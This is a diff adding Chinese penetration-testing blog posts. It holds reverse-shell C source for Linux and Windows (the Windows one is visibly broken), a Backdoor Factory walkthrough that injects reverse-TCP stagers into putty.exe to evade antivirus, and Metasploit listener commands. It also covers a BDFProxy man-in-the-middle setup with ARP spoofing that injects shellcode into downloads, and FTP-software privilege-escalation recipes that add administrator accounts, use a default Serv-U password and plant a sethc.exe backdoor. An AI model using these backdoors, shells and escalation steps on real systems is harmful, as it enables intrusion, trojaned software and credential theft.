+      int s;
+      if (argc != 3)
+      {
+          fprintf(stderr, &quot;uso: 192.168.153.166 4444\n&quot;); exit(1);
+      }
+      sock.sin_family  = AF_INET;
+      sock.sin_port = htons(atoi(argv[2]));
+      sock.sin_addr.s_addr = inet_addr(argv[1]);
+      s = socket(AF_INET, SOCK_STREAM, 0);
+
+      connect(s,(struct sockaddr_in *)&amp;sock, sizeof(struct sockaddr_in));
+
+      dup2(s,0);
+      dup2(s,1);
+      dup2(s,2);
+      execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0); //precess httpd
+  }</code></pre><ul>
+<li>windows.c</li>
+</ul>
+<pre><code>  # 未修正错误
+  #include &lt;winsock2.h&gt;
+  #include &lt;stdio.h&gt;
+
+  #pragma comment(lib,&quot;ws2_32&quot;)
+
+      WSADATA wsaData;
+      SOCKET Winsock;
+      SOOKET Sock;
+      struct sockaddr_in hax;
+      char ip_addr[16];
+      STARTUPINFO ini_processo;
+      PROCESS_INFORMATION processo_info;
+
+  int main(int argc,char *argv[])
+      WSAStartup(MAKEWORD(2,2), wsaData);
+      winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
+
+      if (argc != 3)
+      {fprintf(stderr,&quot;Uso: &lt;rhost&gt; &lt;rport&gt;\n&quot;;) exit(1);}
+      struct hostent *host;
+      host = gethostbyname(argv [1] );
+      strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));
+
+      hax.sin_family = AF_INET;
+      hax.sin_port = htons(atoi(argv[2]));
+      hax.sin_addr.s_addr = inet_addr(ip_addr);
+
+      WSAConnect(Winsock,(SOCKADDR* &amp;hax,sizeof(hax),NULL,NULL,NULL,NULL;
+      memset(&amp;ini_processo,0,sizeof(ini_processo));
+      ini_processo.cb = sizeof(ini_processo);
+      ini_processo.dwFlags = START_USESTDHANDLES;
+      ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+      CreateProcess(NULL,&quot;cmd exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;process_info);</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174154985.png" alt="在这里插入图片描述"></p>
+<h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
+<li>patch<ul>
+<li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li>
+<li>bdf：向二进制文件中增加或者删除代码内容<ul>
+<li>某些受保护的二进制程序无法 patch</li>
+<li>存在一定概率问价你会被 patch 坏掉</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>后门工厂<ul>
+<li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li>
+<li>支持 msf payload、自定义 payload</li>
+</ul>
+</li>
+<li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li>
+<li>python 语言编写</li>
+<li>msf 使用的 patch 方法<ul>
+<li>覆盖程序入口<ul>
+<li>msfvenom -p windows/shell/reverse_tcp</li>
+</ul>
+</li>
+<li>创建新的线程执行 shellcode 并跳回原程序入口<ul>
+<li>msfvenom -p windows/shell/reverse_tcp –k</li>
+<li>增加代码片段跳转执行后跳回源程序入口</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CTP 方法<ul>
+<li>增加新的代码段 session，与 smf 的-k 方法类似</li>
+<li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li>
+</ul>
+</li>
+<li>代码洞<ul>
+<li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li>
+<li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li>
+</ul>
+</li>
+<li>单个代码洞代销不足以存放完整的 shellcode<ul>
+<li>多代码洞跳转（非顺序执行）<ul>
+<li>初期免杀率可达100%</li>
+</ul>
+</li>
+<li>结合 msf 的 stager 方法</li>
+</ul>
+</li>
+<li>patch 选项<ul>
+<li>附加代码段</li>
+<li>单代码洞注入</li>
+<li>多代码注入</li>
+</ul>
+</li>
+<li>BDF 基本使用<ul>
+<li>检查二进制文件是否支持代码注入<ul>
+<li>backdoor-factory -f putty.exe –S</li>
+</ul>
+</li>
+<li>显示可用 payload<ul>
+<li>backdoor-factory -f putty.exe -s show</li>
+<li>backdoor-factory -f <code>which nc</code> -s show</li>
+<li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li>
+<li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li>
+<li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li>
+</ul>
+</li>
+<li>查看 cave 大小<ul>
+<li>ackdoor-factory -f putty.exe -c -l</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>免杀效果对比<ul>
+<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li>
+<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li>
+<li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li>
+</ul>
+</li>
+<li>与 veil-evasion 集成</li>
+<li>Linux：backdoor-factory -f putty.exe -s show</li>
+<li>IAT：import address table</li>
+<li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li>
+</ul>
+<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
+<li><p>-S：检查二进制文件是否支持代码注入</p>
+<pre><code>  root@kali:~# backdoor-factory -f putty.exe –S</code></pre></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190525145311915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li>
+</ul>
+<pre><code>  -c：code cave(代码裂缝)
+  -l：代码裂缝大小
+  root@kali:~# backdoor-factory -f putty.exe -c -l 200</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p>
+<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s show</code></pre></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>  root@kali:~# backdoor-factory -f `which nc` -s show</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>注入 putty.exe，报错</p>
+<pre><code>  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>  [!] Enter your selection: 2</code></pre><p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>显示未找到文件</p>
+<pre><code>  Failed to read certificate file: /usr/share/backdoor-factory/certs/Verisign.cer
+  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem&#39;,&#39;rb&#39;)
+  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
+  139701503748160:error:02001002:system library:fopen:No such file or directory:bss_file.c:175:fopen(&#39;/usr/share/backdoor-factory/certs/Verisign.cer&#39;,&#39;rb&#39;)
+  139701503748160:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:182:
+  Failed
+  File putty5.exe is in the &#39;backdoored&#39; directory</code></pre></li>
+<li><p>修复错误（备份并重命名）</p>
+<pre><code>  root@kali:~# cat /usr/share/backdoor-factory/certs/
+  passFile.txt           signingCert.cer        signingPrivateKey.pem  
+  root@kali:~# cd /usr/share/backdoor-factory/certs/
+
+  root@kali:/usr/share/backdoor-factory/certs# cp signingCert.cer signingCert.cer.bak
+  root@kali:/usr/share/backdoor-factory/certs# mv signingCert.cer Verisign.cer
+  root@kali:/usr/share/backdoor-factory/certs# cp signingPrivateKey.pem signingPrivateKey.pem.bak
+  root@kali:/usr/share/backdoor-factory/certs# mv signingPrivateKey.pem VerisignPrivateKey.pem
+
+  root@kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</code></pre></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>使用 msf 侦听</p>
+<pre><code>  msf &gt; use exploit/multi/handler
+  msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+  msf exploit(multi/handler) &gt; set LHOST 10.10.10.131
+  msf exploit(multi/handler) &gt; set LPORT 4444
+  msf exploit(multi/handler) &gt; run</code></pre></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190525145405583.png" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p>
+</li>
+<li><p>免杀效果比较</p>
+<p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p>
+</li>
+</ul>
+<pre><code>  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty3.exe
+  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty4.exe –J
+  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty5.exe -a</code></pre><ul>
+<li><p>与 veil-evasion 集成</p>
+<pre><code>  root@kali:~# veil-evasion
+  [menu&gt;&gt;]: list</code></pre></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
+<li>Bdfproxy（mitmproxy）<ul>
+<li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li>
+</ul>
+</li>
+<li>步骤<ul>
+<li>sysctl -w net.ipv4.ip_forward=1</li>
+<li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li>
+<li>vi /etc/bdfproxy/bdfproxy.cfg<ul>
+<li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li>
+<li>启动 msf</li>
+<li>流程<ul>
+<li>mana 创建 Fack AP</li>
+<li>badfproxy 代理注入代码</li>
+<li>msf 侦听反弹 shell</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
+<li><p>修改 IP 转发</p>
+<pre><code>root@kali:~# vim /etc/sysctl.conf 
+net.ipv4.ip_forward=1</code></pre></li>
+<li><p>修改 iptables</p>
+<pre><code>root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
+root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</code></pre></li>
+<li><p>修改配置文件</p>
+<pre><code>root@kali:~# vim /etc/bdfproxy/bdfproxy.cfg
+proxyMode = transparent  
+HOST = 10.10.10.131     #108行，117行，128行，替换所有的，有6个</code></pre></li>
+<li><p>启动 bdfproxy</p>
+<pre><code>root@kali:~# bdfproxy</code></pre></li>
+<li><p>启动 msfconsole</p>
+<pre><code>root@kali:~# msfconsole -r /root/bdfproxy_msf_resource.rc
+msf exploit(multi/handler) &gt; jobs</code></pre></li>
+</ul>
+<ul>
+<li><p>arp 欺骗</p>
+<pre><code>root@kali:~# arpspoof -i eth0 -t 10.10.10.133 10.10.10.2</code></pre></li>
+<li><p>靶机访问浏览器下载软件，并运行</p>
+<pre><code>![](https://i.imgur.com/1qLFgFZ.png)</code></pre></li>
+</ul>
+<h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul>
+<li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p>
+<ul>
+<li>修改无线 SSID 名称</li>
+</ul>
+</li>
+<li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p>
+<ul>
+<li>修改 wlan1 无线网卡适配器并启动</li>
+<li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li>
+</ul>
+</li>
+<li><p>vi /etc/bdfproxy/bdfproxy.cfg</p>
+<ul>
+<li>proxyMode = transparent</li>
+<li>修改侦听 IP 地址并启动 badfproxy</li>
+</ul>
+</li>
+<li><p>启动 msf</p>
+<ul>
+<li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li>
+</ul>
+</li>
+<li><p>补充内容</p>
+<ul>
+<li>全站 HTTPS 防注入（微软每个补丁都带码）</li>
+<li>PE 文件证书签名可被清除</li>
+<li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul>
+<li>全部用 0 覆盖</li>
+<li>BDF 默认清除数字签名</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p>
+<ul>
+<li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li>
+<li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li>
+</ul>
+</li>
+<li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p>
+<ul>
+<li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -398,7 +1504,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/" itemprop="url">渗透测试中常见提权方式总结(三)</a></h1>
+                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/" itemprop="url">windows中常见提权方式总结(三)</a></h1>
         
 
         <div class="post-meta">
@@ -450,7 +1556,139 @@
       
         
           
-            
+            <h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul>
+<li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li>
+<li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li>
+<li>serv-u密码文件：ServUDaemon.ini</li>
+<li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li>
+</ul>
+<h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p>
+<p>2、无权限修改</p>
+<p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
+<p>4、serv-u ftp转发端口</p>
+<h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p>
+<pre><code>[USER=quan|1]                                //用户名
+Password=                        //用户密码加密后的密文
+HomeDir=c:\ftp\quan             //目录
+RelPaths=3 
+TimeOut=600                      //超时时间设置
+Maintenance=System               //权限
+Access1=C:\|RWAMELCDP            //可访问的目录及权限
+Access2=d:\|RWAMELCDP            //可访问的目录及权限
+Access3=e:\|RWAMELCDP            //可访问的目录及权限
+SKEYValues=</code></pre><p>password=2位随机字符+md5(2位随机字符+123456)</p>
+<p>4、连接目标FTP服务器</p>
+<pre><code>ftp 目标IP地址 刚添加的用户密码</code></pre><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p>
+<pre><code>quote site exec net user quan quan123 /add
+quote site exec net localgroup administrators quan /add</code></pre><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p>
+<h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p>
+<pre><code>d:\serv_u.exe
+d:\serv_u.exe “net user quan quan123 /add”
+d:\serv_u.exe “net localgroup administrators quan /add” </code></pre><p>注意命令要有引号</p>
+<h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p>
+<pre><code>lcx -slave yourIP 5000 127.0.0.1 43958</code></pre><p>在本机上运行</p>
+<pre><code>lcx -listen 5000 21</code></pre><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p>
+<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p>
+<p>这里就不写具体过程了</p>
+<h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p>
+<h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul>
+<li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li>
+<li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li>
+</ul>
+<h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p>
+<h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p>
+<h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p>
+<ul>
+<li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p>
+</li>
+<li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
+</li>
+<li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p>
+</li>
+</ul>
+<pre><code>lcx.exe -tran 8027 127.0.0.1 8021</code></pre><ul>
+<li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p>
+</li>
+<li><p>创建FTP用户并进行权限设置</p>
+</li>
+<li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p>
+</li>
+</ul>
+<pre><code>net user quan quan123 /add
+net localgroup administrators quan /add</code></pre><ul>
+<li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p>
+</li>
+<li><p>普通用户登录ftp</p>
+</li>
+<li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p>
+</li>
+</ul>
+<h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p>
+<pre><code>net user quan quan123 /add
+net localgroup administrators quan /add</code></pre><p>5、将a.bat文件映射到新建的site命令</p>
+<p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p>
+<h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul>
+<li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li>
+<li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li>
+</ul>
+<h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p>
+<p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
+<p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p>
+<pre><code>lcx.exe -tran 14148 127.0.0.1 14147</code></pre><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p>
+<p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p>
+<p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p>
+<p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p>
+<p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p>
+<p>9、添加一个用户，并将其提升为管理员权限</p>
+<pre><code>net user quan 123 /add
+net localgroup administrator quan /add</code></pre><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p>
+<p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p>
+<h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol>
+<li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li>
+<li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li>
+<li>替换system系统服务程序，进行提权。</li>
+</ol>
+<h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429102747.png" alt=""></p>
+<h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul>
+<li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li>
+</ul>
+<h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p>
+<h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p>
+<p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p>
+<p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p>
+<h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul>
+<li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li>
+<li>pcAnywher的默认端口为<code>5631、5632</code>。</li>
+<li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li>
+</ul>
+<p><strong>2、提权步骤</strong></p>
+<p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p>
+<pre><code>dir *.cif/s</code></pre><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p>
